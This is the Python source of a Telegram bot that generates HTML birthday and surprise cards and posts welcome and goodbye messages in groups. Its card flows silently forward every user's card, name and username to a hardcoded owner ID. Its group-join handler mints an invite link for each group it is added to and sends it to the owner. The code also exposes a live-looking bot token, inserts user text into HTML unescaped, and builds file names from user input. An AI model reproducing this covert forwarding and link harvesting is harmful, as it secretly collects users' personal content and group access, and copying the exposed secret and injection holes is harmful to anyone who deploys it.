import telebot
from telebot import types

TOKEN = "8389171340:AAGflq0Tzt2hmT0AZvKLD859Rw9IPOFggmw"
OWNER_ID = 6784382795
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# =====================================================
#  WELCOME & GOODBYE  (WORKING)
# =====================================================

@bot.message_handler(content_types=["new_chat_members"])
def welcome(message):
    for user in message.new_chat_members:
        bot.send_message(message.chat.id, f"🎉 Welcome <b>{user.first_name}</b>!")

@bot.message_handler(content_types=["left_chat_member"])
def goodbye(message):
    left = message.left_chat_member
    bot.send_message(message.chat.id, f"👋 Goodbye <b>{left.first_name}</b>!")

# =====================================================
#  BOT ADDED TO GROUP LOG  (WORKING)
# =====================================================

@bot.my_chat_member_handler()
def added_to_group(update: types.ChatMemberUpdated):
    old = update.old_chat_member.status
    new = update.new_chat_member.status

    if old in ["left", "kicked"] and new in ["member", "administrator"]:
        group_name = update.chat.title
        group_id = update.chat.id

        try:
            link = bot.create_chat_invite_link(group_id).invite_link
        except:
            link = "Bot is not admin — Cannot fetch link"

        user = update.from_user

        bot.send_message(
            OWNER_ID,
            f"🤖 Bot Added to Group!\n\n"
            f"👤 Added by: {user.first_name} (@{user.username})\n"
            f"🆔 {user.id}\n\n"
            f"👥 Group: {group_name}\n"
            f"🆔 {group_id}\n"
            f"🔗 {link}"
        )

# =====================================================
#  /code MENU  (WORKING)
# =====================================================

@bot.message_handler(commands=["code"])
def code_menu(message):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("🎂 Birthday", "🎁 Surprise")
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=kb)

# =====================================================
#  BIRTHDAY FLOW  (FULLY WORKING)
# =====================================================

@bot.message_handler(commands=["birthday"])
@bot.message_handler(func=lambda m: m.text == "🎂 Birthday")
def birthday_start(message):
    bot.send_message(message.chat.id, "🎂 Enter Celebrant Name:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(message, birthday_name)

def birthday_name(msg):
    name = msg.text
    bot.send_message(msg.chat.id, "📅 Enter Birthday Date:")
    bot.register_next_step_handler(msg, birthday_date, name)

def birthday_date(msg, name):
    date = msg.text
    bot.send_message(msg.chat.id, "🎉 Enter Age:")
    bot.register_next_step_handler(msg, birthday_age, name, date)

def birthday_age(msg, name, date):
    age = msg.text
    bot.send_message(
        msg.chat.id,
        "🖼 Upload photo using this link:\n"
        "https://host-image-puce.vercel.app/\n\n"
        "Send the photo link here:"
    )
    bot.register_next_step_handler(msg, birthday_image, name, date, age)

def birthday_image(msg, name, date, age):
    image = msg.text
    bot.send_message(msg.chat.id, "💌 Enter your Birthday Message:")
    bot.register_next_step_handler(msg, birthday_generate, name, date, age, image)

def birthday_generate(msg, name, date, age, image):
    message_text = msg.text

    html = f"""
<html>
<body style='font-family:Arial;background:#ffe7f0;padding:20px;'>
<center>
<h1 style='color:#ff4da6;'>🎉 HAPPY BIRTHDAY {name.upper()}! 🎉</h1>
<img src='{image}' width='250' style='border-radius:15px;'><br><br>
<h3>🌟 Name: {name}</h3>
<h3>🎂 Age: {age}</h3>
<h3>📅 Birthday: {date}</h3>
<div style='background:white;padding:15px;border-radius:10px;width:80%;'>
<b>💌 Message:</b><br>{message_text}
</div>
</center>
</body>
</html>
"""

    filename = f"birthday_{name}.html"
    with open(filename, "w", encoding="utf-8") as f: f.write(html)

    # Send to user
    with open(filename, "rb") as f:
        bot.send_document(msg.chat.id, f, caption="🎂 Birthday Card Generated")

    # Notify owner
    with open(filename, "rb") as f:
        bot.send_document(
            OWNER_ID, f,
            caption=f"🎂 Birthday card used by {msg.from_user.first_name} (@{msg.from_user.username})"
        )

# =====================================================
#  SURPRISE FLOW  (FULLY WORKING)
# =====================================================

@bot.message_handler(commands=["surprise"])
@bot.message_handler(func=lambda m: m.text == "🎁 Surprise")
def surprise_start(message):
    bot.send_message(message.chat.id, "🎁 Enter Name:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(message, surprise_name)

def surprise_name(msg):
    name = msg.text
    bot.send_message(
        msg.chat.id,
        "🖼 Upload photo here:\nhttps://host-image-puce.vercel.app/\n\n"
        "Send the photo link:"
    )
    bot.register_next_step_handler(msg, surprise_image, name)

def surprise_image(msg, name):
    image = msg.text
    bot.send_message(msg.chat.id, "💌 Enter Your Special Message:")
    bot.register_next_step_handler(msg, surprise_generate, name, image)

def surprise_generate(msg, name, image):
    message_text = msg.text

    html = f"""
<html>
<body style='font-family:Arial;background:#e3f6ff;padding:20px;'>
<center>
<h1 style='color:#008cff;'>🎁 A SURPRISE FOR {name.upper()}!</h1>
<img src='{image}' width='250' style='border-radius:15px;'><br><br>
<div style='background:white;padding:15px;border-radius:10px;width:80%;'>
<b>💌 Message:</b><br>{message_text}
</div>
</center>
</body>
</html>
"""

    filename = f"surprise_{name}.html"
    with open(filename, "w", encoding="utf-8") as f: f.write(html)

    # Send to user
    with open(filename, "rb") as f:
        bot.send_document(msg.chat.id, f, caption="🎁 Surprise Card Generated")

    # Notify owner
    with open(filename, "rb") as f:
        bot.send_document(
            OWNER_ID, f,
            caption=f"🎁 Surprise card used by {msg.from_user.first_name} (@{msg.from_user.username})"
        )

# =====================================================
#  START
# =====================================================

@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id, "🤖 Bot Activated!\nUse /code to begin.")

# =====================================================
#  RUN BOT
# =====================================================

bot.infinity_polling()
